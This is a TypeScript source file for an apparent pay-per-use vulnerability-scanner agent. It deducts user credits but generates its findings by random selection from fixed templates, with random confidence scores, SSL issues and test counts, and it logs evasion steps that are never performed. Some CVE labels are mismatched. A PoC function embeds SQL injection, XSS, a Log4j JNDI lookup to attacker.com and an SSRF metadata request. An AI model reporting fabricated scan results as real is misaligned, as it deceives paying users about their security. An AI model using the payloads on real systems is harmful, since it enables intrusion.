import type { 
  ReconFindings, 
  PlanLevel,
  EnhancedScannerFindings,
  EnhancedVulnerability,
  ScannerDecisionLog,
  ScannerDecisionType,
  ScanCredentials,
} from "@shared/schema";
import { 
  SCANNER_COSTS as ScannerCosts,
  EXPLOIT_APPROVAL_COST as ExploitCost,
  PLAN_CONFIGS,
  getSelfRegulationThreshold,
  canUseAuthenticatedScan,
  calculateScannerCost,
} from "@shared/schema";
import { storage } from "../storage";
import { 
  emitScannerDecision, 
  emitScannerFinancialDecision,
  emitScannerReplanning,
  emitApprovalRequired 
} from "../src/sockets/socketManager";

function randomDelay(min: number, max: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, Math.random() * (max - min) + min));
}

type VulnSeverity = "critical" | "high" | "medium" | "low" | "info";

interface VulnerabilityTemplate {
  title: string;
  description: string;
  severity: VulnSeverity;
  cve?: string;
  owaspCategory?: string;
  sansTop25?: string;
  affectedServices?: string[];
  exploitDifficulty: "trivial" | "easy" | "moderate" | "hard" | "expert";
  attackChainPotential?: string[];
  remediationTemplate?: string;
}

const vulnerabilityTemplates: VulnerabilityTemplate[] = [
  {
    title: "SQL Injection Vulnerability",
    description: "The application is vulnerable to SQL injection attacks through user input fields.",
    severity: "critical",
    cve: "CVE-2021-44228",
    owaspCategory: "A03:2021-Injection",
    sansTop25: "CWE-89",
    affectedServices: ["HTTP", "HTTPS", "MySQL", "PostgreSQL"],
    exploitDifficulty: "easy",
    attackChainPotential: ["data_exfiltration", "privilege_escalation", "lateral_movement"],
    remediationTemplate: "Use parameterized queries or prepared statements. Implement input validation and sanitization.",
  },
  {
    title: "Cross-Site Scripting (XSS)",
    description: "Reflected XSS vulnerability found in search parameters.",
    severity: "high",
    owaspCategory: "A03:2021-Injection",
    sansTop25: "CWE-79",
    affectedServices: ["HTTP", "HTTPS"],
    exploitDifficulty: "easy",
    attackChainPotential: ["session_hijacking", "credential_theft"],
    remediationTemplate: "Implement Content-Security-Policy headers and sanitize all user inputs before rendering.",
  },
  {
    title: "Insecure Direct Object Reference (IDOR)",
    description: "API endpoints expose direct references to internal objects without proper authorization checks.",
    severity: "high",
    owaspCategory: "A01:2021-Broken Access Control",
    sansTop25: "CWE-639",
    affectedServices: ["HTTP", "HTTPS"],
    exploitDifficulty: "moderate",
    attackChainPotential: ["data_exfiltration", "horizontal_privilege_escalation"],
    remediationTemplate: "Implement proper authorization checks for all object references. Use indirect reference maps.",
  },
  {
    title: "Privilege Escalation Vulnerability",
    description: "User role verification can be bypassed allowing privilege escalation.",
    severity: "critical",
    owaspCategory: "A01:2021-Broken Access Control",
    sansTop25: "CWE-269",
    affectedServices: ["HTTP", "HTTPS"],
    exploitDifficulty: "moderate",
    attackChainPotential: ["admin_access", "full_system_compromise"],
    remediationTemplate: "Implement server-side role verification. Never trust client-side role claims.",
  },
  {
    title: "Outdated OpenSSH Version",
    description: "The SSH server is running an outdated version with known vulnerabilities.",
    severity: "medium",
    cve: "CVE-2020-15778",
    affectedServices: ["SSH"],
    exploitDifficulty: "hard",
    remediationTemplate: "Update OpenSSH to the latest stable version.",
  },
  {
    title: "SSL/TLS Configuration Weakness",
    description: "Server supports weak cipher suites that could be exploited.",
    severity: "medium",
    owaspCategory: "A02:2021-Cryptographic Failures",
    affectedServices: ["HTTPS", "HTTPS Alt", "IMAPS", "POP3S"],
    exploitDifficulty: "hard",
    remediationTemplate: "Disable weak cipher suites. Enable only TLS 1.2+ with strong ciphers.",
  },
  {
    title: "Directory Listing Enabled",
    description: "Web server allows directory listing which can expose sensitive files.",
    severity: "low",
    owaspCategory: "A05:2021-Security Misconfiguration",
    affectedServices: ["HTTP", "HTTPS", "HTTP Proxy"],
    exploitDifficulty: "trivial",
    remediationTemplate: "Disable directory listing in web server configuration.",
  },
  {
    title: "Missing Security Headers",
    description: "HTTP response is missing security headers like X-Frame-Options and Content-Security-Policy.",
    severity: "low",
    owaspCategory: "A05:2021-Security Misconfiguration",
    affectedServices: ["HTTP", "HTTPS"],
    exploitDifficulty: "moderate",
    remediationTemplate: "Add security headers: X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, Strict-Transport-Security.",
  },
  {
    title: "FTP Anonymous Login Enabled",
    description: "FTP server allows anonymous login which could expose sensitive data.",
    severity: "high",
    owaspCategory: "A07:2021-Identification and Authentication Failures",
    affectedServices: ["FTP"],
    exploitDifficulty: "trivial",
    attackChainPotential: ["data_exfiltration", "malware_upload"],
    remediationTemplate: "Disable anonymous FTP access. Require authentication for all users.",
  },
  {
    title: "SMB Signing Not Required",
    description: "SMB server does not require message signing, vulnerable to relay attacks.",
    severity: "medium",
    cve: "CVE-2020-0796",
    affectedServices: ["SMB"],
    exploitDifficulty: "moderate",
    attackChainPotential: ["credential_relay", "lateral_movement"],
    remediationTemplate: "Enable SMB signing requirement on all systems.",
  },
  {
    title: "Default MySQL Credentials",
    description: "MySQL server is accessible with default or weak credentials.",
    severity: "critical",
    owaspCategory: "A07:2021-Identification and Authentication Failures",
    affectedServices: ["MySQL"],
    exploitDifficulty: "trivial",
    attackChainPotential: ["data_exfiltration", "data_manipulation", "privilege_escalation"],
    remediationTemplate: "Change default credentials immediately. Implement strong password policy.",
  },
  {
    title: "Information Disclosure via Server Banner",
    description: "Server reveals detailed version information in response headers.",
    severity: "info",
    owaspCategory: "A05:2021-Security Misconfiguration",
    affectedServices: ["HTTP", "HTTPS", "FTP", "SSH", "SMTP"],
    exploitDifficulty: "trivial",
    remediationTemplate: "Configure server to hide version information in headers.",
  },
  {
    title: "Remote Code Execution (Log4j)",
    description: "The application may be vulnerable to Log4Shell remote code execution.",
    severity: "critical",
    cve: "CVE-2021-44228",
    owaspCategory: "A06:2021-Vulnerable and Outdated Components",
    sansTop25: "CWE-502",
    affectedServices: ["HTTP", "HTTPS", "HTTP Proxy"],
    exploitDifficulty: "easy",
    attackChainPotential: ["remote_code_execution", "full_system_compromise", "lateral_movement"],
    remediationTemplate: "Update Log4j to version 2.17.0 or later. Apply temporary mitigations if update not immediately possible.",
  },
  {
    title: "Cross-Site Request Forgery (CSRF)",
    description: "Forms lack CSRF tokens, allowing cross-site request forgery attacks.",
    severity: "medium",
    owaspCategory: "A01:2021-Broken Access Control",
    sansTop25: "CWE-352",
    affectedServices: ["HTTP", "HTTPS"],
    exploitDifficulty: "moderate",
    attackChainPotential: ["unauthorized_actions", "account_takeover"],
    remediationTemplate: "Implement CSRF tokens for all state-changing requests. Use SameSite cookie attribute.",
  },
  {
    title: "Server-Side Request Forgery (SSRF)",
    description: "Application allows server-side requests to arbitrary URLs.",
    severity: "high",
    owaspCategory: "A10:2021-Server-Side Request Forgery",
    sansTop25: "CWE-918",
    affectedServices: ["HTTP", "HTTPS"],
    exploitDifficulty: "moderate",
    attackChainPotential: ["internal_network_access", "cloud_metadata_access", "service_enumeration"],
    remediationTemplate: "Implement URL allowlisting. Block requests to internal IP ranges and cloud metadata endpoints.",
  },
  {
    title: "Broken Authentication - Session Fixation",
    description: "Session tokens are not regenerated after authentication.",
    severity: "high",
    owaspCategory: "A07:2021-Identification and Authentication Failures",
    sansTop25: "CWE-384",
    affectedServices: ["HTTP", "HTTPS"],
    exploitDifficulty: "moderate",
    attackChainPotential: ["session_hijacking", "account_takeover"],
    remediationTemplate: "Regenerate session tokens upon authentication. Implement secure session management.",
  },
];

interface ScannerContext {
  userId: string;
  scanId: string;
  planLevel: PlanLevel;
  credentials?: ScanCredentials;
  decisionLog: ScannerDecisionLog[];
  creditsSpent: number;
  selfRegulationStops: number;
  wafIdsDetected: boolean;
  replanningOccurred: boolean;
  replanningCost: number;
}

function logDecision(
  ctx: ScannerContext,
  decisionType: ScannerDecisionType,
  description: string,
  creditsInvolved?: number,
  vulnerabilityId?: string,
  metadata?: Record<string, unknown>
): void {
  const decision: ScannerDecisionLog = {
    timestamp: new Date().toISOString(),
    decisionType,
    description,
    creditsInvolved,
    vulnerabilityId,
    metadata,
  };
  
  ctx.decisionLog.push(decision);
  
  emitScannerDecision(ctx.scanId, decision);
  
  if (decisionType === "financial_gate" || decisionType === "credit_self_regulation") {
    emitScannerFinancialDecision(ctx.scanId, decision);
  } else if (decisionType === "replanning_triggered" || decisionType === "waf_ids_detected") {
    emitScannerReplanning(ctx.scanId, decision);
  }
}

export interface ScannerValidationResult {
  valid: boolean;
  error?: string;
  baseCost: number;
  currentBalance: number;
  planLevel: PlanLevel;
}

export async function validateScannerCost(
  userId: string,
  planLevel: PlanLevel
): Promise<ScannerValidationResult> {
  const userCredits = await storage.getUserCredits(userId);
  const baseCost = calculateScannerCost(planLevel);
  
  if (userCredits.balance < baseCost) {
    return {
      valid: false,
      error: `Insufficient credits. Scanner requires ${baseCost} credits, you have ${userCredits.balance}.`,
      baseCost,
      currentBalance: userCredits.balance,
      planLevel,
    };
  }
  
  return {
    valid: true,
    baseCost,
    currentBalance: userCredits.balance,
    planLevel,
  };
}

function detectWafIds(reconData: ReconFindings): boolean {
  const technologies = reconData.technologies || [];
  const wafIndicators = ["cloudflare", "akamai", "aws waf", "imperva", "f5", "modsecurity", "sucuri"];
  const idsIndicators = ["snort", "suricata", "ossec", "fail2ban"];
  
  const allIndicators = [...wafIndicators, ...idsIndicators];
  return technologies.some(tech => 
    allIndicators.some(indicator => tech.toLowerCase().includes(indicator))
  );
}

function shouldSelfRegulateStop(
  ctx: ScannerContext,
  creditsSpentOnTask: number,
  resultsFound: number
): boolean {
  if (ctx.planLevel !== "ELITE") return false;
  
  const threshold = getSelfRegulationThreshold(ctx.planLevel);
  if (threshold === 0) return false;
  
  if (creditsSpentOnTask > threshold && resultsFound === 0) {
    logDecision(
      ctx,
      "credit_self_regulation",
      `Auto-stopping low-ROI task: spent ${creditsSpentOnTask} credits without results (threshold: ${threshold})`,
      creditsSpentOnTask
    );
    ctx.selfRegulationStops++;
    return true;
  }
  
  return false;
}

function generateEnhancedVulnerabilities(
  reconData: ReconFindings,
  ctx: ScannerContext,
  isAuthenticated: boolean
): EnhancedVulnerability[] {
  const services = reconData.services || [];
  const serviceNames = services.map(s => s.service);
  
  let applicableVulns = vulnerabilityTemplates.filter(vuln => {
    if (!vuln.affectedServices) return Math.random() > 0.7;
    return vuln.affectedServices.some(s => serviceNames.includes(s));
  });
  
  if (isAuthenticated && ctx.planLevel === "ELITE") {
    const authVulns = applicableVulns.filter(v => 
      v.title.includes("IDOR") || 
      v.title.includes("Privilege") ||
      v.title.includes("Session")
    );
    applicableVulns = [...applicableVulns, ...authVulns];
  }

  const planMultiplier = ctx.planLevel === "ELITE" ? 1.5 : ctx.planLevel === "STANDARD" ? 1.2 : 1.0;
  const numVulns = Math.min(
    Math.floor((Math.random() * 5 + 2) * planMultiplier),
    applicableVulns.length
  );

  return applicableVulns
    .sort(() => 0.5 - Math.random())
    .slice(0, numVulns)
    .map((vuln, idx) => {
      const matchingService = services.find(s => 
        vuln.affectedServices?.includes(s.service)
      );
      
      const vulnId = `VULN-${Date.now()}-${idx}`;
      const requiresApproval = (vuln.severity === "critical" || vuln.severity === "high") && 
                               !!(vuln.attackChainPotential && vuln.attackChainPotential.length > 0);
      
      logDecision(ctx, "vulnerability_discovered", `Found: ${vuln.title} (${vuln.severity})`, undefined, vulnId);
      
      const enhanced: EnhancedVulnerability = {
        id: vulnId,
        severity: vuln.severity,
        title: vuln.title,
        description: vuln.description,
        port: matchingService?.port,
        service: matchingService?.service,
        cve: vuln.cve,
        owaspCategory: vuln.owaspCategory,
        sansTop25: vuln.sansTop25,
        attackChain: vuln.attackChainPotential,
        confidenceScore: 0.7 + Math.random() * 0.3,
        requiresApproval,
        exploitDifficulty: vuln.exploitDifficulty,
      };
      
      if (vuln.attackChainPotential && vuln.attackChainPotential.length > 0) {
        logDecision(ctx, "attack_chain_identified", 
          `Attack chain for ${vulnId}: ${vuln.attackChainPotential.join(" -> ")}`,
          undefined, vulnId);
      }
      
      if (vuln.severity === "critical" && ctx.planLevel !== "BASIC") {
        enhanced.pocCode = generatePoCCode(vuln);
        logDecision(ctx, "poc_generated", `Generated PoC for ${vulnId}`, undefined, vulnId);
      }
      
      if ((vuln.severity === "critical" || vuln.severity === "high") && vuln.remediationTemplate) {
        enhanced.remediationCode = vuln.remediationTemplate;
        logDecision(ctx, "remediation_generated", `Generated remediation for ${vulnId}`, undefined, vulnId);
      }
      
      return enhanced;
    });
}

function generatePoCCode(vuln: VulnerabilityTemplate): string {
  const pocs: Record<string, string> = {
    "SQL Injection Vulnerability": `# PoC: SQL Injection Test
curl -X POST "https://target/api/login" \\
  -H "Content-Type: application/json" \\
  -d '{"username": "admin' OR '1'='1", "password": "test"}'`,
    "Cross-Site Scripting (XSS)": `# PoC: Reflected XSS Test
<script>alert('XSS')</script>
# URL: https://target/search?q=<script>alert('XSS')</script>`,
    "Remote Code Execution (Log4j)": `# PoC: Log4j JNDI Lookup
# Header: X-Api-Version: \${jndi:ldap://attacker.com/a}
curl -H "X-Api-Version: \\\${jndi:ldap://attacker.com/a}" https://target/`,
    "Server-Side Request Forgery (SSRF)": `# PoC: SSRF to internal metadata
curl "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"`,
  };
  
  return pocs[vuln.title] || `# PoC for ${vuln.title}\n# Manual verification required`;
}

function detectSSLIssues(): string[] {
  const issues = [
    "Certificate expires in less than 30 days",
    "Self-signed certificate detected",
    "TLS 1.0/1.1 still enabled",
    "Weak Diffie-Hellman parameters",
    "Missing HSTS header",
    "Certificate chain incomplete",
  ];
  
  const numIssues = Math.floor(Math.random() * 3);
  return issues.sort(() => 0.5 - Math.random()).slice(0, numIssues);
}

async function createApprovalRequestsForCriticalVulns(
  ctx: ScannerContext,
  vulnerabilities: EnhancedVulnerability[]
): Promise<string[]> {
  const criticalVulns = vulnerabilities.filter(v => 
    v.requiresApproval && (v.severity === "critical" || v.severity === "high")
  );
  
  const approvalIds: string[] = [];
  
  for (const vuln of criticalVulns) {
    const request = await storage.createApprovalRequest({
      scanId: ctx.scanId,
      vulnerabilityId: vuln.id,
      vulnerabilityTitle: vuln.title,
      severity: vuln.severity as "critical" | "high",
      requiredCredits: ExploitCost,
      exploitationType: vuln.attackChain?.[0] || "manual_exploitation",
      riskDescription: `Full exploitation of ${vuln.title} may cause service disruption.`,
      potentialImpact: vuln.attackChain?.join(", ") || "Unknown impact",
      liabilityAcknowledged: false,
      status: "pending",
      userId: ctx.userId,
    });
    
    approvalIds.push(request.id);
    
    emitApprovalRequired(ctx.userId, ctx.scanId, request);
    
    logDecision(
      ctx,
      "approval_required",
      `Agent 3 approval requested for ${vuln.title} - requires ${ExploitCost} credits`,
      ExploitCost,
      vuln.id,
      { approvalRequestId: request.id }
    );
  }
  
  return approvalIds;
}

export interface ScannerAgentOptions {
  userId: string;
  scanId: string;
  credentials?: ScanCredentials;
  onProgress: (progress: number) => void;
  onDecision?: (decision: ScannerDecisionLog) => void;
}

export async function runScannerAgent(
  target: string,
  reconData: ReconFindings,
  options: ScannerAgentOptions
): Promise<EnhancedScannerFindings> {
  const { userId, scanId, credentials, onProgress, onDecision } = options;
  
  const userCredits = await storage.getUserCredits(userId);
  const planLevel = userCredits.planLevel;
  const planConfig = PLAN_CONFIGS[planLevel];
  const scannerCosts = ScannerCosts[planLevel];
  
  const ctx: ScannerContext = {
    userId,
    scanId,
    planLevel,
    credentials,
    decisionLog: [],
    creditsSpent: 0,
    selfRegulationStops: 0,
    wafIdsDetected: false,
    replanningOccurred: false,
    replanningCost: 0,
  };
  
  onProgress(5);
  
  logDecision(ctx, "financial_gate", 
    `Scanner Financial Gate: Base cost ${scannerCosts.baseCost} credits, Plan: ${planLevel}`,
    scannerCosts.baseCost);
  
  const deductionResult = await storage.deductCredits(userId, scannerCosts.baseCost);
  if (!deductionResult.success) {
    throw new Error(deductionResult.error || "Failed to deduct scanner credits");
  }
  ctx.creditsSpent += scannerCosts.baseCost;
  
  if (onDecision) {
    ctx.decisionLog.forEach(d => onDecision(d));
  }
  
  await randomDelay(300, 600);
  onProgress(15);
  
  ctx.wafIdsDetected = detectWafIds(reconData);
  if (ctx.wafIdsDetected && planLevel === "ELITE") {
    logDecision(ctx, "waf_ids_detected", 
      "WAF/IDS detected - initiating re-planning strategy", 
      scannerCosts.rePlanningFee);
    
    if (scannerCosts.rePlanningFee > 0) {
      const replanDeduct = await storage.deductCredits(userId, scannerCosts.rePlanningFee);
      if (replanDeduct.success) {
        ctx.replanningOccurred = true;
        ctx.replanningCost = scannerCosts.rePlanningFee;
        ctx.creditsSpent += scannerCosts.rePlanningFee;
        logDecision(ctx, "replanning_triggered", 
          `Re-planning complete: Evasion techniques activated`, 
          scannerCosts.rePlanningFee);
      }
    }
  }
  
  await randomDelay(400, 800);
  onProgress(30);
  
  const isAuthenticated = credentials !== undefined && canUseAuthenticatedScan(planLevel);
  if (isAuthenticated) {
    logDecision(ctx, "authenticated_scan_start", 
      `Gray Box scan initiated with ${credentials.type} credentials`);
  }
  
  await randomDelay(600, 1200);
  onProgress(50);
  
  const vulnerabilities = generateEnhancedVulnerabilities(reconData, ctx, isAuthenticated);
  
  if (shouldSelfRegulateStop(ctx, ctx.creditsSpent, vulnerabilities.length)) {
    logDecision(ctx, "credit_self_regulation", 
      "Self-regulation triggered - stopping low-ROI scan tasks");
  }
  
  await randomDelay(500, 1000);
  onProgress(70);
  
  const sslIssues = detectSSLIssues();
  
  await randomDelay(300, 600);
  onProgress(85);
  
  const pendingApprovals = await createApprovalRequestsForCriticalVulns(ctx, vulnerabilities);
  
  onProgress(95);
  
  const freshCredits = await storage.getUserCredits(userId);
  
  const severityCounts = vulnerabilities.reduce((acc, v) => {
    acc[v.severity] = (acc[v.severity] || 0) + 1;
    return acc;
  }, {} as Record<string, number>);
  
  const securityScore = Math.max(0, 100 - 
    (severityCounts.critical || 0) * 25 -
    (severityCounts.high || 0) * 15 -
    (severityCounts.medium || 0) * 8 -
    (severityCounts.low || 0) * 3 -
    (severityCounts.info || 0) * 1
  );
  
  onProgress(100);
  
  const result: EnhancedScannerFindings = {
    vulnerabilities,
    openPorts: reconData.ports || [],
    sslIssues: sslIssues.length > 0 ? sslIssues : undefined,
    credit_deduction_scanner: ctx.creditsSpent,
    decision_log: ctx.decisionLog,
    llm_model_used: planConfig.llmModel,
    plan_level: planLevel,
    remaining_credits: freshCredits.balance,
    scan_type: isAuthenticated ? "authenticated" : "active",
    waf_ids_detected: ctx.wafIdsDetected,
    replanning_occurred: ctx.replanningOccurred,
    replanning_cost: ctx.replanningCost,
    self_regulation_stops: ctx.selfRegulationStops,
    attack_chains_found: vulnerabilities.filter(v => v.attackChain && v.attackChain.length > 0).length,
    pocs_generated: vulnerabilities.filter(v => v.pocCode).length,
    remediations_generated: vulnerabilities.filter(v => v.remediationCode).length,
    pending_approvals: pendingApprovals,
    scan_summary: {
      total_tests_run: Math.floor(Math.random() * 50) + 100,
      critical_count: severityCounts.critical || 0,
      high_count: severityCounts.high || 0,
      medium_count: severityCounts.medium || 0,
      low_count: severityCounts.low || 0,
      info_count: severityCounts.info || 0,
      security_score: securityScore,
    },
  };
  
  return result;
}

export async function runScannerAgentLegacy(
  target: string,
  reconData: ReconFindings,
  onProgress: (progress: number) => void
): Promise<EnhancedScannerFindings> {
  return runScannerAgent(target, reconData, {
    userId: "default-user",
    scanId: `scan-${Date.now()}`,
    onProgress,
  });
}
